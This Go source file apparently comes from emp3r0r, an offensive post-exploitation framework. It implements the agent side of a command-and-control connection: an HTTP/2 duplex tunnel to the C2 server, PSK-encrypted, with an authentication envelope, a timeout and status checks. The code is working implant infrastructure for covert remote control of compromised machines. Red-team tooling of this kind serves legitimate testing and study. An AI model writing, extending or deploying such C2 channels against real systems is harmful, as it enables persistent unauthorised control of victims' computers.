package c2transport

import (
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/posener/h2conn"
)

// EstablishC2Connection connect to CC with h2conn.
// All auth is carried in the MsgAuth CBOR envelope sent over the PSK-encrypted
// stream — no HTTP headers carry any C2 security authority.
func EstablishC2Connection(url string, streamID string, capabilities ...string) (conn *h2conn.Conn, ctx context.Context, cancel context.CancelFunc, err error) {
	// use h2conn for duplex tunnel
	ctx, cancel = context.WithCancel(context.Background())

	h2 := h2conn.Client{
		Client: def.HTTPClient,
		Method: http.MethodPost,
		// No auth headers — routing and identity are in the CBOR MsgAuth envelope.
	}
	logging.Infof("EstablishC2Connection: connecting to %s", url)

	type connectResult struct {
		conn *h2conn.Conn
		resp *http.Response
		err  error
	}
	resultChan := make(chan connectResult, 1)

	go func() {
		c, r, e := h2.Connect(ctx, url)
		resultChan <- connectResult{conn: c, resp: r, err: e}
	}()

	select {
	case res := <-resultChan:
		conn = res.conn
		resp := res.resp
		err = res.err
		if err != nil {
			err = fmt.Errorf("EstablishConnection: initiate h2 conn: %s", err)
			logging.Print(err)
			cancel()
			return
		}
		// Check server status code
		if resp != nil {
			if resp.StatusCode != http.StatusOK {
				err = fmt.Errorf("bad status code: %d", resp.StatusCode)
				conn = nil
				cancel()
				return
			}
		}

		// PSK-encrypt immediately, then send MsgAuth CBOR envelope.
		// The server reads this as its first frame and uses it for all routing/auth.
		caps, capErr := normalizeMsgAuthCapabilities(capabilities)
		if capErr != nil {
			err = fmt.Errorf("normalize MsgAuth capabilities: %w", capErr)
			_ = conn.Close()
			conn = nil
			cancel()
			return
		}
		secureConn := transport.NewSecureConn(conn)
		if sendErr := sendMsgAuthEnvelope(secureConn, caps, streamID); sendErr != nil {
			err = fmt.Errorf("send MsgAuth: %w", sendErr)
			_ = conn.Close()
			conn = nil
			cancel()
			return
		}
	case <-time.After(10 * time.Second):
		err = fmt.Errorf("EstablishConnection at %s failed: timeout", url)
		cancel()
		return
	}

	return
}


func normalizeMsgAuthCapabilities(capabilities []string) ([]string, error) {
	seen := make(map[string]struct{}, len(capabilities)+1)
	normalized := make([]string, 0, len(capabilities)+1)
	for _, cap := range capabilities {
		if cap == "" {
			continue
		}
		if _, ok := seen[cap]; ok {
			continue
		}
		seen[cap] = struct{}{}
		normalized = append(normalized, cap)
	}
	if len(normalized) == 0 {
		return nil, fmt.Errorf("at least one explicit MsgAuth capability is required")
	}
	return normalized, nil
}
